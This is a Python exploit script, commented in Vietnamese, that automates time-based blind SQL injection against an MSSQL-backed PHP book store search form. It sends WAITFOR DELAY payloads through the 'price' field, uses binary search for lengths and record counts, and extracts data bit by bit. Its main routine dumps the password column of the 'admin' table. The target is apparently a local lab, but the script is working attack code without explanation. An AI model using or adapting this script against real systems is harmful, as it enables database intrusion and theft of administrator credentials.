import requests
import time
MAX_LENGTH = 100  # Giả sử độ dài chuỗi không vượt quá 100 ký tự

# Cấu hình mục tiêu
URL = 'http://localhost.com/online-book-store-project-in-php/search_1.php'  # Thay bằng URL thật
DELAY_THRESHOLD = 3

# Hàm kiểm tra một giá trị bằng cách đo thời gian phản hồi
def check_condition(payload):
    start_time = time.time() # Lưu thời gian bắt đầu
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
               "Host": "localhost.com",
               "Cookie": "PHPSESSID=jqk0bhqeg7non5lmcm878o3pdr",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": "http://localhost.com",
                "Referer": "http://localhost.com/online-book-store-project-in-php/search_1.php",
                "Upgrade-Insecure-Requests": '1'}
 
    data = {"price": payload}
    requests.post(URL, headers=headers, data=data)
    elapsed_time = time.time() - start_time # Tính thời gian đã trôi qua
    return elapsed_time > DELAY_THRESHOLD # Kiểm tra xem thời gian có vượt quá ngưỡng không


#Tìm độ dài của chuỗi hoặc số lượng bản ghi bằng Binary Search.
def find_length(query, column="LEN", delay_time="00:00:03"):
    
    low, high = 1, MAX_LENGTH

    while low < high:
        mid = (low + high + 1) // 2  # Làm tròn lên để tránh vòng lặp vô hạn

        # Tạo payload SQL Injection động
        if column.upper() == "LEN":
            payload = f"20'; IF (SELECT LEN(({query}))) >= {mid} WAITFOR DELAY '{delay_time}';--"
        elif column.upper() == "COUNT":
            payload = f"20'; IF (SELECT COUNT(*) FROM {query}) >= {mid} WAITFOR DELAY '{delay_time}';--"
        else:
            raise ValueError("Tham số column phải là 'LEN' hoặc 'COUNT'.")

        # Kiểm tra nếu có delay (tức là giá trị >= mid)
        if check_condition(payload):
            low = mid  # Nếu phản hồi chậm, giá trị >= mid
        else:
            high = mid - 1  # Nếu phản hồi nhanh, giá trị < mid

    return low  # Khi low == high, đó chính là kết quả
    
# Hàm kiểm tra một bit có phải là 1 không (dựa trên truy vấn được truyền vào)
def check_bit(query, index, bit_position):
   
    bit_value = 2 ** bit_position  # 2^bit_position (1, 2, 4, 8, ..., 128)

    # Payload SQL Injection sử dụng truy vấn được truyền vào
    payload = f"20'; IF ASCII(SUBSTRING(({query}), {index}, 1)) & {bit_value} = {bit_value} BEGIN WAITFOR DELAY '00:00:03' END-- -"

    return 1 if check_condition(payload) else 0  # Trả về 1 nếu bit = 1, ngược lại trả về 0

def extract_character(query,index):
    char_ascii = 0  # Mã ASCII của ký tự
    for bit in range(8):  # Duyệt qua từng bit (từ 0 đến 7)
        if check_bit(query, index, bit):  # Nếu bit này là 1
            char_ascii += 2**bit  # Cộng vào tổng mã ASCII

    return chr(char_ascii) if char_ascii != 0 else None  # Trả về ký tự

# Hàm dò toàn bộ chuỗi
def extract_string(query):
    result = ""  # Chuỗi kết quả
    index = 1  # Bắt đầu từ ký tự đầu tiên

    while True:
        char = extract_character(query,index)  # Dò ký tự thứ index
        if not char:  # Nếu không có ký tự nào nữa thì dừng
            break
        result += char  # Thêm ký tự vào chuỗi kết quả
        index += 1  # Chuyển sang ký tự tiếp theo
        print(f"[+] Đã tìm được: {result}")
    
    return result
   
#Đếm số bản ghi của 1 bảng do mình điền vào và lấy ra tên các bản ghi trong bảng đó
def auto(column_name, table_name):
    #chạy vòng lặp for để lấy ra tất cả tên bảng
    arr = []
    for i in range(find_length(table_name,column="COUNT")):
        payload = f"SELECT {column_name} FROM {table_name} ORDER BY 1 OFFSET {i} ROW FETCH NEXT 1 ROW ONLY"
        arr.append(payload)
    
    for idx, query in enumerate(arr): #enumerate(arr) trả về cả chỉ mục (idx) và giá trị (query) của phần tử trong danh sách
        record = extract_string(query)
        print(f"[+] Bảng {idx + 1}: {record}")  # Đánh số đúng thứ tự
     
if __name__ == '__main__':
    column_name="table_name"
    table_name = "information_schema.tables WHERE table_catalog=DB_NAME()"
    column_name_1 = "column_name"
    table_name_1 = "information_schema.columns WHERE table_name='admin'"
    column_name_2 = "pass"
    table_name_2 = "admin"
    auto(column_name_2,table_name_2)
